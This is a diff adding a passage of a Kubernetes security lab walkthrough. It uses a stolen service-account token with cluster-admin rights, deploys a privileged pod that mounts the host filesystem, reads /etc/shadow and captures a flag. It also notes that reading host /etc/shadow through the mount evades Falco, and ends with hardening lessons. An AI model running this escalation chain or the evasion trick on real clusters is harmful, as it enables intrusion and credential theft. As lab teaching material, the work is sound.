@@ -68,3 +68,71 @@ Output: Long list of system bindings. At the bottom: `vuln-sa-admin` bound to
 `cluster-admin`. Suspicious.
 
 **Step 8.** Inspect the binding.
+```bash
+kubectl ... get clusterrolebinding vuln-sa-admin -o yaml
+```
+Output shows:
+- `roleRef.name: cluster-admin`, god mode permissions
+- `subjects.name: vuln-sa`, the same service account whose token was stolen
+- `kind: ClusterRoleBinding`, applies across the entire cluster, not just one namespace
+
+> `kubectl ...` above is shorthand for the full flag set:
+> `--server=https://192.168.50.10:6443 --token=$TOKEN --insecure-skip-tls-verify`
+
+---
+
+## Phase 2: Privilege Escalation (run from Kali)
+
+**Step 1.** Examine the attack pod YAML (`~/Desktop/pwned.yaml`, see
+[`pwned.yaml`](./pwned.yaml) in this folder).
+
+What makes this dangerous:
+- `privileged: true`, disables ALL container isolation
+- `hostPID: true`, pod can see all host processes
+- `hostNetwork: true`, pod shares the host's network
+- `hostPath: /` at `/host`, entire host filesystem accessible
+- `nodeName: worker`, forces the pod onto VM2 where the flag is
+
+**Step 2.** Deploy the privileged pod.
+```bash
+kubectl ... apply -f ~/Desktop/pwned.yaml
+```
+
+**Step 3.** Read `/etc/shadow` inside the container (triggers Falco).
+```bash
+kubectl ... exec -it pwned -n vuln-app -- cat /etc/shadow
+```
+This is a natural attacker enumeration step, checking if you're root and what
+accounts exist. Falco catches this.
+
+**Step 4.** Capture the flag from the host filesystem.
+```bash
+kubectl ... exec -it pwned -n vuln-app -- cat /host/root/flag/proof.txt
+```
+Output: `FLAG{k8s_privilege_escalation_successful}`
+
+Complete takeover: from a web bug to full host access in a few commands.
+
+> Detection note (see `../detection/DETECTION.md`): `cat /etc/shadow` inside the
+> container triggers Falco because it traverses the container's filesystem
+> namespace. `cat /host/etc/shadow` via the hostPath mount does NOT trigger
+> Falco. The mount is a direct passthrough to the host, bypassing the
+> container namespace that Falco's eBPF probe watches.
+
+---
+
+## The Three Vulnerabilities This Chain Exploits
+
+| # | Vulnerability | Role in the chain | If fixed |
+|---|---|---|---|
+| 1 | Local File Inclusion (LFI) | Reads the SA token from inside the pod | Attack stops at step 1 |
+| 2 | RBAC over-permission (`vuln-sa` = `cluster-admin`) | Stolen token = full cluster control | Attack stops at step 4 |
+| 3 | No Pod Security Standards | Lets attacker create a privileged pod / escape to host | Attack stops at step 5 |
+
+> **LFI opens the door → RBAC gives the keys → No PSS lets the attacker walk
+> out of the building.** Remove any one and the full attack chain breaks.
+>
+> The lab does **not** fix the LFI. That is an application code bug (a
+> developer's job). The point is that proper Kubernetes controls (RBAC + PSS)
+> limit the blast radius even while the app stays vulnerable. See
+> `../hardening/HARDENING.md`.
